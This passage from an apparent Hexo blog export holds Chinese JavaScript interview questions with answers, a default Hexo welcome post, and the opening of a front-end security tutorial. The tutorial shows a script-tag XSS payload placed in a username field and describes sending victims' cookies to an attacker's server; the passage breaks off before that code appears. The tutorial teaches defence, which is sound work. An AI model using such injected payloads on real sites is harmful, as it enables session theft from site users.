class="line">};</span><br></pre></td></tr></tbody></table></figure><p>接着上述答题，那么问题来了</p><p><strong>1）直接在对象的原型上添加方法是否安全？尤其是在Object对象上。(这个我没能答出？希望知道的说一下。)</strong>　</p><p><strong>2）函数声明与函数表达式的区别？</strong></p><p>答案：</p><p>1） </p><ul><li>容易造成全局污染，和其他库冲突</li><li>出了Bug不太好定位问题</li><li>有可能出现代码向上不兼容的情况，比如定义了一个Object.prototype.clone。万一ES7、ES8也定义了这个函数，那旧代码不就会出现问题了嘛！</li></ul><p>2）在Javscript中，解析器在向执行环境中加载数据时，对函数声明和函数表达式并非是一视同仁的，解析器会率先读取函数声明，并使其在执行任何代码之前可用（可以访问），至于函数表达式，则必须等到解析器执行到它所在的代码行，才会真正被解析执行。（函数声明提升）</p><h3 id="8-定义一个log方法，让它可以代理console-log的方法。"><a href="#8-定义一个log方法，让它可以代理console-log的方法。" class="headerlink" title="==8. 定义一个log方法，让它可以代理console.log的方法。=="></a>==8. 定义一个log方法，让它可以代理console.log的方法。==</h3><p>可行的方法一：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function log(msg)　 {</span><br><span class="line">    console.log(msg);</span><br><span class="line">}</span><br><span class="line">log("hello world!") // hello world!</span><br></pre></td></tr></tbody></table></figure><p>如果要传入多个参数呢？显然上面的方法不能满足要求，所以更好的方法是：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function log() {</span><br><span class="line">    console.log.apply(console, arguments);</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>那么问题来了，<strong>apply和call方法的异同</strong>？　　</p><p>答案：</p><p>对于apply和call两者在作用上是相同的，即是调用一个对象的一个方法，以另一个对象替换当前对象。将一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象。</p><p>但两者在参数上有区别的。对于第一个参数意义都一样，但对第二个参数： apply传入的是一个参数数组，也就是将多个参数组合成为一个数组传入，而call则作为call的参数传入（从第二个参数开始）。 如 func.call(func1,var1,var2,var3)对应的apply写法为：func.apply(func1,[var1,var2,var3]) 。</p><h3 id="9-在Javascript中什么是伪数组？如何将伪数组转化为标准数组？"><a href="#9-在Javascript中什么是伪数组？如何将伪数组转化为标准数组？" class="headerlink" title="==9. 在Javascript中什么是伪数组？如何将伪数组转化为标准数组？=="></a>==9. 在Javascript中什么是伪数组？如何将伪数组转化为标准数组？==</h3><p>答案：</p><p>伪数组（类数组）：无法直接调用数组方法或期望length属性有什么特殊的行为，但仍可以对真正数组遍历方法来遍历它们。典型的是函数的argument参数，还有像调用getElementsByTagName,document.childNodes之类的,它们都返回NodeList对象都属于伪数组。可以使用Array.prototype.slice.call(fakeArray)将数组转化为真正的Array对象。</p><p>假设接第八题题干，我们要给每个log方法添加一个”(app)”前缀，比如’hello world!’ ->’(app)hello world!’。方法如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function log() {</span><br><span class="line">    var args = Array.prototype.slice.call(arguments); //为了使用unshift数组方法，将argument转化为真正的数组</span><br><span class="line">    args.unshift('(app)');</span><br><span class="line"> </span><br><span class="line">    console.log.apply(console, args);</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="10-对作用域上下文和this的理解，看下列代码："><a href="#10-对作用域上下文和this的理解，看下列代码：" class="headerlink" title="==10. 对作用域上下文和this的理解，看下列代码：=="></a>==10. 对作用域上下文和this的理解，看下列代码：==</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var User = {</span><br><span class="line">    count: 1,</span><br><span class="line"> </span><br><span class="line">    getCount: function() {</span><br><span class="line">        return this.count;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line">console.log(User.getCount()); // what?</span><br><span class="line">var func = User.getCount;</span><br><span class="line">console.log(func()); // what?</span><br></pre></td></tr></tbody></table></figure><p>问两处 console 输出什么？为什么？</p><p>答案是 1 和 undefined。</p><p>func 是在 winodw 的上下文中被执行的，所以会访问不到 count 属性。</p><p>那么问题来了，如何确保Uesr总是能访问到func的上下文，即正确返回1。</p><p>答案：正确的方法是使用Function.prototype.bind。兼容各个浏览器完整代码如下:</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = Function.prototype.bind || function(context) {</span><br><span class="line">    var self = this;</span><br><span class="line"> </span><br><span class="line">    return function() {</span><br><span class="line">        return self.apply(context, arguments);</span><br><span class="line">    };</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line">var func = User.getCount.bind(User);</span><br><span class="line">console.log(func());</span><br></pre></td></tr></tbody></table></figure><h3 id="11-原生JS的window-onload与Jquery的-document-ready-function-有什么不同？如何用原生JS实现Jq的ready方法？"><a href="#11-原生JS的window-onload与Jquery的-document-ready-function-有什么不同？如何用原生JS实现Jq的ready方法？" class="headerlink" title="==11. 原生JS的window.onload与Jquery的$(document).ready(function(){})有什么不同？如何用原生JS实现Jq的ready方法？=="></a>==11. 原生JS的window.onload与Jquery的$(document).ready(function(){})有什么不同？如何用原生JS实现Jq的ready方法？==</h3><p>window.onload()方法是必须等到页面内包括图片的所有元素加载完毕后才能执行。</p><p>$(document).ready()是DOM结构绘制完毕后就执行，不必等到加载完毕。 </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * 传递函数给whenReady()</span><br><span class="line"> * 当文档解析完毕且为操作准备就绪时，函数作为document的方法调用</span><br><span class="line"> */</span><br><span class="line">var whenReady = (function() { //这个函数返回whenReady()函数</span><br><span class="line">    var funcs = []; //当获得事件时，要运行的函数</span><br><span class="line">    var ready = false; //当触发事件处理程序时,切换为true</span><br><span class="line"> </span><br><span class="line">    //当文档就绪时,调用事件处理程序</span><br><span class="line">    function handler(e) {</span><br><span class="line">        if (ready) return; //确保事件处理程序只完整运行一次</span><br><span class="line"> </span><br><span class="line">        //如果发生onreadystatechange事件，但其状态不是complete的话,那么文档尚未准备好</span><br><span class="line">        if (e.type === 'onreadystatechange' && document.readyState !== 'complete') {</span><br><span class="line">            return;</span><br><span class="line">        }</span><br><span class="line"> </span><br><span class="line">        //运行所有注册函数</span><br><span class="line">        //注意每次都要计算funcs.length</span><br><span class="line">        //以防这些函数的调用可能会导致注册更多的函数</span><br><span class="line">        for (var i = 0; i < funcs.length; i++) {</span><br><span class="line">            funcs[i].call(document);</span><br><span class="line">        }</span><br><span class="line">        //事件处理函数完整执行,切换ready状态, 并移除所有函数</span><br><span class="line">        ready = true;</span><br><span class="line">        funcs = null;</span><br><span class="line">    }</span><br><span class="line">    //为接收到的任何事件注册处理程序</span><br><span class="line">    if (document.addEventListener) {</span><br><span class="line">        document.addEventListener('DOMContentLoaded', handler, false);</span><br><span class="line">        document.addEventListener('readystatechange', handler, false); //IE9+</span><br><span class="line">        window.addEventListener('load', handler, false);</span><br><span class="line">    } else if (document.attachEvent) {</span><br><span class="line">        document.attachEvent('onreadystatechange', handler);</span><br><span class="line">        window.attachEvent('onload', handler);</span><br><span class="line">    }</span><br><span class="line">    //返回whenReady()函数</span><br><span class="line">    return function whenReady(fn) {</span><br><span class="line">        if (ready) {</span><br><span class="line">            fn.call(document);</span><br><span class="line">        } else {</span><br><span class="line">            funcs.push(fn);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">})();</span><br></pre></td></tr></tbody></table></figure><p>如果上述代码十分难懂，下面这个简化版：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function ready(fn){</span><br><span class="line">    if(document.addEventListener) {        //标准浏览器</span><br><span class="line">        document.addEventListener('DOMContentLoaded', function() {</span><br><span class="line">            //注销事件, 避免反复触发</span><br><span class="line">            document.removeEventListener('DOMContentLoaded',arguments.callee, false);</span><br><span class="line">            fn();            //执行函数</span><br><span class="line">        }, false);</span><br><span class="line">    }else if(document.attachEvent) {        //IE</span><br><span class="line">        document.attachEvent('onreadystatechange', function() {</span><br><span class="line">            if(document.readyState == 'complete') {</span><br><span class="line">                document.detachEvent('onreadystatechange', arguments.callee);</span><br><span class="line">                fn();        //函数执行</span><br><span class="line">            }</span><br><span class="line">        });</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="12-（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）"><a href="#12-（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）" class="headerlink" title="==12.（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）=="></a>==12.（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）==</h3><p>回答出概念即可，下面是几个要点</p><ul><li>给需要拖拽的节点绑定mousedown, mousemove, mouseup事件</li><li>mousedown事件触发后，开始拖拽</li><li>mousemove时，需要通过event.clientX和clientY获取拖拽位置，并实时更新位置</li><li>mouseup时，拖拽结束</li><li>需要注意浏览器边界的情况</li></ul><ol start="13"><li>说出以下函数的作用是？空白区域应该填写什么？</li></ol><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//define</span><br><span class="line">(function(window) {</span><br><span class="line">    function fn(str) {</span><br><span class="line">        this.str = str;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    fn.prototype.format = function() {</span><br><span class="line">        var arg = ______;</span><br><span class="line">        return this.str.replace(_____, function(a, b) {</span><br><span class="line">            return arg[b] || "";</span><br><span class="line">        });</span><br><span class="line">    }</span><br><span class="line">    window.fn = fn;</span><br><span class="line">})(window);</span><br><span class="line"> </span><br><span class="line">//use</span><br><span class="line">(function() {</span><br><span class="line">    var t = new fn('<p><a href="{0}">{1}</a><span>{2}</span></p>');</span><br><span class="line">    console.log(t.format('http://www.alibaba.com', 'Alibaba', 'Welcome'));</span><br><span class="line">})();</span><br></pre></td></tr></tbody></table></figure><p>答案：访函数的作用是使用format函数将函数的参数替换掉{0}这样的内容，返回一个格式化后的结果：</p><p>第一个空是：arguments<br>第二个空是：/{(\d+)}/ig</p><h3 id="14-用面向对象的Javascript来介绍一下自己。（没答案哦亲，自己试试吧）"><a href="#14-用面向对象的Javascript来介绍一下自己。（没答案哦亲，自己试试吧）" class="headerlink" title="==14. 用面向对象的Javascript来介绍一下自己。（没答案哦亲，自己试试吧）=="></a>==14. 用面向对象的Javascript来介绍一下自己。（没答案哦亲，自己试试吧）==</h3><p>答案： 对象或者Json都是不错的选择哦。</p><h3 id="15-讲解原生Js实现ajax的原理。"><a href="#15-讲解原生Js实现ajax的原理。" class="headerlink" title="==15. 讲解原生Js实现ajax的原理。=="></a>==15. 讲解原生Js实现ajax的原理。==</h3><p>Ajax 的全称是Asynchronous JavaScript and XML，其中，Asynchronous 是异步的意思，它有别于传统web开发中采用的同步的方式。</p><p>Ajax的原理简单来说通过XmlHttpRequest对象来向服务器发异步请求，从服务器获得数据，然后用javascript来操作DOM而更新页面。</p><p>XMLHttpRequest是ajax的核心机制，它是在IE5中首先引入的，是一种支持异步请求的技术。简单的说，也就是javascript可以及时向服务器提出请求和处理响应，而不阻塞用户。达到无刷新的效果。</p><p>XMLHttpRequest这个对象的属性有：</p><ul><li>onreadystatechang    每次状态改变所触发事件的事件处理程序。</li><li>responseText    从服务器进程返回数据的字符串形式。</li><li>responseXML    从服务器进程返回的DOM兼容的文档数据对象。</li><li>status    从服务器返回的数字代码，比如常见的404（未找到）和200（已就绪）</li><li>status Text    伴随状态码的字符串信息</li><li>readyState    对象状态值<ul><li>0 (未初始化) 对象已建立，但是尚未初始化（尚未调用open方法）</li><li>1 (初始化) 对象已建立，尚未调用send方</li><li>2 (发送数据) send方法已调用，但是当前的状态及http头未知</li><li>3 (数据传送中) 已接收部分数据，因为响应及http头不全，这时通过responseBody和responseText获取部分数据会出现错误，</li><li>4 (完成) 数据接收完毕,此时可以通过通过responseXml和responseText获取完整的回应数据</li></ul></li></ul><p>　　下面简单封装一个函数：（略长，点击打开）　</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">ajax({</span><br><span class="line">        url: "./TestXHR.aspx",              //请求地址</span><br><span class="line">        type: "POST",                       //请求方式</span><br><span class="line">        data: { name: "super", age: 20 },        //请求参数</span><br><span class="line">        dataType: "json",</span><br><span class="line">        success: function (response, xml) {</span><br><span class="line">            // 此处放成功后执行的代码</span><br><span class="line">        },</span><br><span class="line">        fail: function (status) {</span><br><span class="line">            // 此处放失败后执行的代码</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line"></span><br><span class="line">    function ajax(options) {</span><br><span class="line">        options = options || {};</span><br><span class="line">        options.type = (options.type || "GET").toUpperCase();</span><br><span class="line">        options.dataType = options.dataType || "json";</span><br><span class="line">        var params = formatParams(options.data);</span><br><span class="line"></span><br><span class="line">        //创建 - 非IE6 - 第一步</span><br><span class="line">        if (window.XMLHttpRequest) {</span><br><span class="line">            var xhr = new XMLHttpRequest();</span><br><span class="line">        } else { //IE6及其以下版本浏览器</span><br><span class="line">            var xhr = new ActiveXObject('Microsoft.XMLHTTP');</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        //接收 - 第三步</span><br><span class="line">        xhr.onreadystatechange = function () {</span><br><span class="line">            if (xhr.readyState == 4) {</span><br><span class="line">                var status = xhr.status;</span><br><span class="line">                if (status >= 200 && status < 300) {</span><br><span class="line">                    options.success && options.success(xhr.responseText, xhr.responseXML);</span><br><span class="line">                } else {</span><br><span class="line">                    options.fail && options.fail(status);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        //连接 和 发送 - 第二步</span><br><span class="line">        if (options.type == "GET") {</span><br><span class="line">            xhr.open("GET", options.url + "?" + params, true);</span><br><span class="line">            xhr.send(null);</span><br><span class="line">        } else if (options.type == "POST") {</span><br><span class="line">            xhr.open("POST", options.url, true);</span><br><span class="line">            //设置表单提交时的内容类型</span><br><span class="line">            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");</span><br><span class="line">            xhr.send(params);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    //格式化参数</span><br><span class="line">    function formatParams(data) {</span><br><span class="line">        var arr = [];</span><br><span class="line">        for (var name in data) {</span><br><span class="line">            arr.push(encodeURIComponent(name) + "=" + encodeURIComponent(data[name]));</span><br><span class="line">        }</span><br><span class="line">        arr.push(("v=" + Math.random()).replace("."));</span><br><span class="line">        return arr.join("&");</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>上述代码大致表述了ajax的过程，释义自行google，问题未完，<strong>那么知道什么是Jsonp和pjax吗？</strong></p><p>答案：</p><p>Jsonp：(JSON with Padding)是一种跨域请求方式。主要原理是利用了script 标签可以跨域请求的特点，由其 src 属性发送请求到服务器，服务器返回 js 代码，网页端接受响应，然后就直接执行了，这和通过 script 标签引用外部文件的原理是一样的。JSONP由两部分组成：回调函数和数据，回调函数一般是由网页端控制，作为参数发往服务器端，服务器端把该函数和数据拼成字符串返回。</p><p>pjax：pjax是一种基于ajax+history.pushState的新技术，该技术可以无刷新改变页面的内容，并且可以改变页面的URL。（关键点：可以实现ajax无法实现的后退功能）pjax是ajax+pushState的封装，同时支持本地存储、动画等多种功能。目前支持jquery、qwrap、kissy等多种版本。</p><h3 id="16-call、apply、bind三者异同"><a href="#16-call、apply、bind三者异同" class="headerlink" title="==16. call、apply、bind三者异同=="></a>==16. call、apply、bind三者异同==</h3><ul><li>apply 、 call 、bind 三者都是用来改变函数的this对象的指向的；</li><li>apply 、 call 、bind 三者第一个参数都是this要指向的对象，也就是想指定的上下文；</li><li>apply 、 call 、bind 三者都可以利用后续参数传参；</li><li>bind是返回对应函数，便于稍后调用；apply、call则是立即调用 。</li></ul><h3 id="17-Javascript的this用法"><a href="#17-Javascript的this用法" class="headerlink" title="==17. Javascript的this用法=="></a>==17. Javascript的this用法==</h3><p>this是Javascript语言的一个关键字。</p><p>它代表函数运行时，自动生成的一个内部对象，只能在函数内部使用。</p><p>随着函数使用场合的不同，this的值会发生变化。但是有一个总的原则，那就是this指的是，调用函数的那个对象。<br>下面分四种情况，详细讨论this的用法。</p><p><strong>情况一：纯粹的函数调用</strong></p><p>这是函数的最通常用法，属于全局性调用，因此this就代表全局对象Global。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var x = 1;</span><br><span class="line">　　function test(){</span><br><span class="line">　　　　this.x = 0;</span><br><span class="line">　　}</span><br><span class="line">　　test();</span><br><span class="line">　　alert(x); //0</span><br></pre></td></tr></tbody></table></figure><p><strong>情况二：作为对象方法的调用</strong></p><p>函数还可以作为某个对象的方法调用，这时this就指这个上级对象</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function test(){</span><br><span class="line">　　　　alert(this.x);</span><br><span class="line">　　}</span><br><span class="line">　　var o = {};</span><br><span class="line">　　o.x = 1;</span><br><span class="line">　　o.m = test;</span><br><span class="line">　　o.m(); // 1</span><br></pre></td></tr></tbody></table></figure><p><strong>情况三 作为构造函数调用</strong></p><p>所谓构造函数，就是通过这个函数生成一个新对象（object）。这时，this就指这个新对象。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var x = 2;</span><br><span class="line">　function test(){</span><br><span class="line">　　this.x = 1;</span><br><span class="line">　}</span><br><span class="line">　var o = new test();</span><br><span class="line">　alert(x); //2</span><br></pre></td></tr></tbody></table></figure><p>运行结果为2，表明全局变量x的值根本没变。</p><p><strong>情况四 call apply调用</strong></p><p>apply()是函数对象的一个方法，它的作用是改变函数的调用对象，它的第一个参数就表示改变后的调用这个函数的对象。因此，this指的就是这第一个参数。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var x = 0;</span><br><span class="line">　　function test(){</span><br><span class="line">　　　　alert(this.x);</span><br><span class="line">　　}</span><br><span class="line">　　var o={};</span><br><span class="line">　　o.x = 1;</span><br><span class="line">　　o.m = test;</span><br><span class="line">　　o.m.apply(); //0</span><br></pre></td></tr></tbody></table></figure><h3 id="18-哪些常见操作会造成内存泄漏？"><a href="#18-哪些常见操作会造成内存泄漏？" class="headerlink" title="==18.哪些常见操作会造成内存泄漏？=="></a>==18.哪些常见操作会造成内存泄漏？==</h3><p>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。<br>垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。<br>setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。<br>闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HelloWorld</title>
      <link href="/2018/05/06/hello-world/"/>
      <url>/2018/05/06/hello-world/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> hello </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hello </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其他问题总结</title>
      <link href="/2018/05/06/%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
      <url>/2018/05/06/%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="1-WEB前端安全那些事儿"><a href="#1-WEB前端安全那些事儿" class="headerlink" title="==1. WEB前端安全那些事儿=="></a>==1. WEB前端安全那些事儿==</h2><h2 id="前端攻击都有哪些形式，我该如何防范？"><a href="#前端攻击都有哪些形式，我该如何防范？" class="headerlink" title="前端攻击都有哪些形式，我该如何防范？"></a>前端攻击都有哪些形式，我该如何防范？</h2><h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><h4 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h4><p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。举个例子，我们有个社交网站，允许大家相互访问空间，网站可能是这样做的：其实在web前端方面，可以简单的理解为一种javascript代码注入。<br>​<br></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><?php</span></span><br><span class="line">    $username=<span class="string">"侯医生"</span>;</span><br><span class="line"><span class="meta">?></span></span><br><span class="line"><!DOCYTPE HTML></span><br><span class="line"><html></span><br><span class="line">    <head></span><br><span class="line">        <meta charset=<span class="string">"utf-8"</span> /></span><br><span class="line">    </head></span><br><span class="line">    <body></span><br><span class="line">        <div></span><br><span class="line">            用户名：<span class="meta"><?php</span> <span class="keyword">echo</span> $username;<span class="meta">?></span></span><br><span class="line">        </div></span><br><span class="line">        <div></span><br><span class="line">            第一条状态：侯医生的状态<span class="number">1</span></span><br><span class="line">        </div></span><br><span class="line">        <div></span><br><span class="line">            第二条状态：侯医生的状态<span class="number">2</span></span><br><span class="line">        </div></span><br><span class="line">        <div></span><br><span class="line">            第三条状态：侯医生的状态<span class="number">3</span></span><br><span class="line">        </div></span><br><span class="line">    </body></span><br><span class="line"></html></span><br></pre></td></tr></tbody></table></figure><p></p><p>运行时，展现形式如图所示：</p><p><img src="https://segmentfault.com/img/bVB9cO" alt="image"></p><p>但是，如果你的用户名，起名称的时候，带上script标签呢？我们知道，浏览器遇到html中的script标签的时候，会解析并执行标签中的js脚本代码，那么如果你的用户名称里面含有script标签的话，就可以执行其中的代码了。代码如下，效果如图</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><?php</span><br><span class="line">    $username="<script>alert('侯医生');</script>";</span><br><span class="line">?></span><br></pre></td></tr></tbody></table></figure><p><img src="https://segmentfault.com/img/bVB9or" alt="image"></p><p>如果你将自己的用户名设定为这种执行脚本的方式，再让别人去访问你的连接的话，就可以达到在他人web环境中，执行自己脚本的效果了。我们还可以使用ajax，将其他用户在当前域名下的cookie获取并发送到自己的服务器上。这样就可以获取他人信息了。比如，刚刚咱们使用的不是alert而是，如下的代码：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 